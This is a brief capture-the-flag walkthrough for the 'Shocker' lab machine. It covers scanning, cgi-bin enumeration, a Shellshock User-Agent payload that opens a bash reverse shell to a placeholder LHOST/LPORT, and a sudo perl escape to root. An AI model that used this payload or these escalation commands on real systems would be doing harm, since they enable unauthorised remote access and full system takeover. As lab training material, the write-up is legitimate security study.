## Foothold

1. Upon running nmap we can see that there are two ports running: 80, 2222(custom ssh port)
2. Visiting the site, there aren't many attack vectors present.
3. As the name of the box suggests shocker, it might be prone to shellshock. Checking for cgi-bin, we get 300
4. We can run gobuster on 10.10.10.56/cgi-bin/ with -x pl,py,sh,cgi
5. We get a hit for user.sh, thus this can be our entry point.
7. Run a listener on any port.
6. Use the python script, or just change the User-Agent of our request to:  () { :; }; /bin/bash -i >& /dev/tcp/LHOST/LPORT 0>&1 &
7. We can get a rev shell for shelly. Cat out the user.txt

## Priv Esc

8. sudo -l gives that we can run /usr/bin/perl as root with NOPASSWD.
9. sudo perl -e 'exec "/bin/bash"'
10. Gives us a root shell
